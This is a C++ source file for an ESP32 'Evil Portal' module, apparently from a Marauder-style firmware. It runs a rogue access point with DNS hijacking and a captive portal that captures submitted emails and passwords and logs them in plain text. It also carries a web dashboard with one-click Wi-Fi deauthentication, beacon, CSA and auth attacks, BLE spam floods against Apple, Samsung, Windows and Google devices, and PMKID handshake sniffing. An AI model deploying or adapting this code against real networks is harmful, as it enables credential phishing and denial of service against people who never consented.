#include "EvilPortal.h"
#include "WiFiScan.h"

char apName[MAX_AP_NAME_SIZE] = "PORTAL";

#ifdef HAS_PSRAM
  char* index_html = nullptr;
#endif

AsyncWebServer server(80);

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  html_files = new LinkedList<String>();

  #ifdef HAS_SD
    if (sd_obj.supported) {
      sd_obj.listDirToLinkedList(html_files, "/", "html");

      Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
    }
  #endif
}

void EvilPortal::cleanup() {
  this->ap_index = -1;

  // Free the per-activation network resources so repeated Start/Stop cycles don't
  // leak: stop the DNS server (frees its UDP pcb) and tear down the SoftAP netif +
  // DHCP lease pool. Previously cleanup() freed only the PSRAM HTML buffer, so each
  // cycle leaked the DNS socket + AP netif and the web handlers grew unbounded (see
  // the register-once guard in startAP()).
  this->dnsServer.stop();
  WiFi.softAPdisconnect(true);

  #ifdef HAS_PSRAM
    free(index_html);
    index_html = nullptr;
  #endif
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  if (!this->has_ap) {
    if (!this->setAP(ssids, access_points))
      return false;
  }
  if (!this->setHtml())
    return false;
    
  startPortal();

  return true;
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  #ifndef HAS_PSRAM
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
      request->send_P(200, "text/html", index_html);
      Serial.println(F("client connected"));
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Client connected to server"));
      #endif
    });
  #else
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
      request->send(200, "text/html", index_html);
      Serial.println("client connected");
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Client connected to server"));
      #endif
    });
  #endif

  const char* captiveEndpoints[] = {
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/success.txt",
    "/generate_204",
    "/gen_204",
    "/ncsi.txt",
    "/connecttest.txt",
    "/redirect"
  };

  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
    
    #ifndef HAS_PSRAM
      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", index_html);
      });
    #else
      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
        request->send(200, "text/html", index_html);
      });
    #endif
  }

  server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", WiFi.softAPSSID());
  });

  server.on("/scanap", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_SCAN_AP);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Scanning APs... Redirecting...</body></html>");
  });

  server.on("/blespam", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(BT_ATTACK_SPAM_ALL);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>BLE Spam Started... Redirecting...</body></html>");
  });

  server.on("/applejuice", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(BT_ATTACK_APPLE_JUICE);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>AppleJuice Started... Redirecting...</body></html>");
  });

  server.on("/sourapple", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(BT_ATTACK_SOUR_APPLE);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>SourApple Started... Redirecting...</body></html>");
  });

  server.on("/swiftpair", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(BT_ATTACK_SWIFTPAIR_SPAM);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>SwiftPair Started... Redirecting...</body></html>");
  });

  server.on("/samsung", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(BT_ATTACK_SAMSUNG_SPAM);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Samsung Spam Started... Redirecting...</body></html>");
  });

  server.on("/google", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(BT_ATTACK_GOOGLE_SPAM);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Google FastPair Started... Redirecting...</body></html>");
  });

  server.on("/beacon", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_ATTACK_BEACON_SPAM);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Beacon Spam Started... Redirecting...</body></html>");
  });

  server.on("/rickroll", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_ATTACK_RICK_ROLL);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Rickroll Started... Redirecting...</body></html>");
  });

  server.on("/deauth", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_ATTACK_DEAUTH);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Deauth Attack Started... Redirecting...</body></html>");
  });

  server.on("/deauth_t", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_ATTACK_DEAUTH_TARGETED);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Deauth Targeted Started... Redirecting...</body></html>");
  });

  server.on("/authattack", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_ATTACK_AUTH);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Auth Attack Started... Redirecting...</body></html>");
  });

  server.on("/badmsg", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_ATTACK_BAD_MSG);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>BadMsg Attack Started... Redirecting...</body></html>");
  });

  server.on("/csaattack", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_ATTACK_CSA);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>CSA Attack Started... Redirecting...</body></html>");
  });

  server.on("/quiet", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_ATTACK_QUIET);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Quiet Attack Started... Redirecting...</body></html>");
  });

  server.on("/probespam", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_SCAN_PROBE);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Probe Spam Started... Redirecting...</body></html>");
  });

  server.on("/sniffprobe", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_SCAN_PROBE);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Probe Sniff Started... Redirecting...</body></html>");
  });

  server.on("/sniffbeacon", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_SCAN_AP);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Beacon Sniff Started... Redirecting...</body></html>");
  });

  server.on("/sniffpmkid", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_SCAN_EAPOL);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>PMKID Sniff Started... Redirecting...</body></html>");
  });

  server.on("/sniffskim", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(BT_SCAN_SKIMMERS);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Skimmer Detect Started... Redirecting...</body></html>");
  });

  server.on("/stop", HTTP_GET, [this](AsyncWebServerRequest *request) {
    wifi_scan_obj.StartScan(WIFI_SCAN_OFF);
    request->send(200, "text/html", "<html><head><meta http-equiv='refresh' content='1;url=/'></head><body>Stopped... Redirecting...</body></html>");
  });

  server.on("/reboot", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", "Rebooting ESP32...");
    delay(500);
    ESP.restart();
  });

  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      this->user_name = inputMessage;
      this->name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      this->password = inputMessage;
      this->password_received = true;
    }
    request->send(
      200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
}

void EvilPortal::setHtmlFromSerial() {
  Serial.println(F("Setting HTML from serial..."));
  const char *htmlStr = Serial.readString().c_str();
  #ifdef HAS_PSRAM
    index_html = (char*) ps_malloc(MAX_HTML_SIZE);
  #endif
  strlcpy(index_html, htmlStr, strlen(htmlStr));
  #ifdef HAS_PSRAM
    index_html[MAX_HTML_SIZE - 1] = '\0';
  #endif
  this->has_html = true;
  this->using_serial_html = true;
  Serial.println("html set");
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    Serial.println(F("html previously set"));
    return true;
  }
  Serial.println(F("Setting HTML..."));
  #ifdef HAS_SD
    File html_file = sd_obj.getFile("/" + this->target_html_name);
  #else
    File html_file;
  #endif
  if (!html_file) {
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not find /" + this->target_html_name);
      this->sendToDisplay(F("Touch to exit..."));
    #endif

    // Built-in integrated Web UI Dashboard for headless C3 SuperMini boards
    const char built_in_ui[] PROGMEM = R"=====(
<!DOCTYPE html><html><head><title>ESP32-C3 Marauder</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;text-align:center;padding:10px;margin:0;}
h2{color:#58a6ff;margin-top:20px;}
h3{color:#8b949e;font-size:14px;margin-top:15px;text-transform:uppercase;letter-spacing:1px;}
p{color:#8b949e;font-size:12px;}
a{display:block;background:#21262d;color:#58a6ff;padding:12px;margin:6px auto;max-width:320px;text-decoration:none;border-radius:6px;font-weight:bold;border:1px solid #30363d;font-size:14px;}
a:hover{background:#30363d;}
a.danger{background:#da3633;color:#fff;border:0;}
a.attack{background:#d29922;color:#fff;border:0;}
a.ble{background:#a371f7;color:#fff;border:0;}
a.sniff{background:#1f6feb;color:#fff;border:0;}
</style></head>
<body>
<h2>ESP32-C3 Marauder</h2>
<p>Complete Web UI Dashboard</p>
<hr/>

<h3>Scanners</h3>
<a href='/scanap' class='sniff'>Scan Access Points</a>
<a href='/sniffprobe' class='sniff'>Sniff Probe Requests</a>
<a href='/sniffbeacon' class='sniff'>Sniff Beacons</a>
<a href='/sniffpmkid' class='sniff'>Sniff PMKID (Handshake)</a>
<a href='/sniffskim' class='sniff'>Detect Bluetooth Skimmers</a>

<h3>WiFi Attacks</h3>
<a href='/beacon' class='attack'>Beacon Spam</a>
<a href='/rickroll' class='attack'>Rickroll WiFi</a>
<a href='/deauth' class='danger'>Deauth All</a>
<a href='/deauth_t' class='danger'>Deauth Targeted</a>
<a href='/authattack' class='attack'>Auth Attack</a>
<a href='/badmsg' class='attack'>BadMsg Attack</a>
<a href='/csaattack' class='attack'>CSA Attack (Channel Switch)</a>
<a href='/quiet' class='attack'>Quiet Attack</a>
<a href='/probespam' class='attack'>Probe Spam</a>

<h3>BLE Attacks</h3>
<a href='/blespam' class='ble'>BLE Spam All (iOS/Android/Win)</a>
<a href='/applejuice' class='ble'>AppleJuice Spam</a>
<a href='/sourapple' class='ble'>SourApple Spam</a>
<a href='/samsung' class='ble'>Samsung BLE Spam</a>
<a href='/swiftpair' class='ble'>Windows SwiftPair Spam</a>
<a href='/google' class='ble'>Google FastPair Spam</a>

<h3>Controls</h3>
<a href='/stop' class='danger'>Stop Attack / Scan</a>
<a href='/reboot' class='danger'>Reboot ESP32</a>
</body></html>
)=====";
    strlcpy(index_html, built_in_ui, MAX_HTML_SIZE);
    this->has_html = true;
    Serial.println("Loaded built-in integrated Web UI dashboard.");
    return true;
  }
  else {
    if (html_file.size() > MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given HTML is too large. Touch to exit..."));
      #endif
      Serial.println("The provided HTML is too large.\nUse stopscan...");
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    #ifdef HAS_PSRAM
      index_html = (char*) ps_malloc(MAX_HTML_SIZE);
    #endif
    strlcpy(index_html, html.c_str(), strlen(html.c_str()));
    #ifdef HAS_PSRAM
      index_html[MAX_HTML_SIZE - 1] = '\0';
    #endif
    this->has_html = true;
    Serial.println("html set");
    html_file.close();
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  int targ_ap_index = -1;
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      targ_ap_index = i;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    #ifdef HAS_SD
      File ap_config_file = sd_obj.getFile("/ap.config.txt");
    #else
      File ap_config_file;
    #endif
    // Could not open config file. return false
    if (!ap_config_file) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Could not find /ap.config.txt."));
        this->sendToDisplay(F("Touch to exit..."));
      #endif
      Serial.println(F("Could not find /ap.config.txt. Use stopscan..."));
      return false;
    }
    // Config file good. Proceed
    else {
      // ap name too long. return false        
      if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
        #ifdef HAS_SCREEN
          this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
        #endif
        Serial.println("The provided AP name is too large.\nUse stopscan...");
        return false;
      }
      // AP name length good. Read from file into var
      while (ap_config_file.available()) {
        char c = ap_config_file.read();
        Serial.print(c);
        if (isPrintable(c)) {
          ap_config.concat(c);
        }
      }
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("AP name from config file"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from config file: " + ap_config);
      ap_config_file.close();
    }
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      Serial.println("The provided AP name is too large.\nUse stopscan...");
      return false;
    }
    #ifdef HAS_SCREEN
      this->sendToDisplay(F("AP name from SSID list"));
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    Serial.println("AP name from SSID list: " + ap_config);
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      Serial.println("The given AP name is too large.\nUse stopscan...");
    }
    else {
      ap_config = temp_ap_name;
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("AP name from AP list"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from AP list: " + ap_config);
    }
  }
  else {
    Serial.println(F("Could not configure Access Point. Use stopscan..."));
    #ifdef HAS_SCREEN
      this->sendToDisplay(F("Could not configure Access Point.\nTouch to exit..."));
    #endif
  }

  if (ap_config != "") {
    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap = true;
    Serial.println(F("ap config set"));
    this->ap_index = targ_ap_index;
    return true;
  }
  else
    return false;

}

bool EvilPortal::setAP(String essid) {
  if (essid == "")
    return false;

  if (essid.length() > MAX_AP_NAME_SIZE) {
    return false;
  }

  strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE);
  this->has_ap = true;
  Serial.println(F("ap config set"));
  return true;
}

void EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apName);

  Serial.print(F("ap ip address: "));
  Serial.println(WiFi.softAPIP());

  // Register the web-server endpoints + captive handler ONCE for the app lifetime.
  // setupServer() appends ~12 handlers and addHandler() allocates a
  // CaptiveRequestHandler; re-running them on every Start leaked those per activation
  // (server._handlers grew unbounded). They are owned by the global `server` and this
  // is the singleton evil_portal_obj, so once is enough; server.begin() is idempotent.
  // The AP + DNS themselves ARE rebuilt each Start (cleanup() tears them down).
  static bool s_server_registered = false;
  if (!s_server_registered) {
    this->setupServer();
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    server.begin();
    s_server_registered = true;
  }

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  Serial.println(F("Evil Portal READY"));
  #ifdef HAS_SCREEN
    this->sendToDisplay(F("Evil Portal READY"));
  #endif
}

void EvilPortal::startPortal() {
  // wait for flipper input to get config index
  this->startAP();

  this->runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
    display_obj.display_buffer->add(display_string);
    display_obj.loading = false;
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !this->has_ap || !this->has_html) {
    return;
  }

  this->dnsServer.processNextRequest();

  if (this->name_received && this->password_received) {
    this->name_received = false;
    this->password_received = false;

    // Adjust size depending on your max username/password length
    char line[96];

    // If user_name / password are still Arduino String:
    snprintf(line, sizeof(line),
             "u: %s p: %s\n",
             this->user_name.c_str(),
             this->password.c_str());

    Serial.print(line);
    buffer_obj.append(line);
    #ifdef HAS_SCREEN
        this->sendToDisplay(line);
    #endif
  }
}
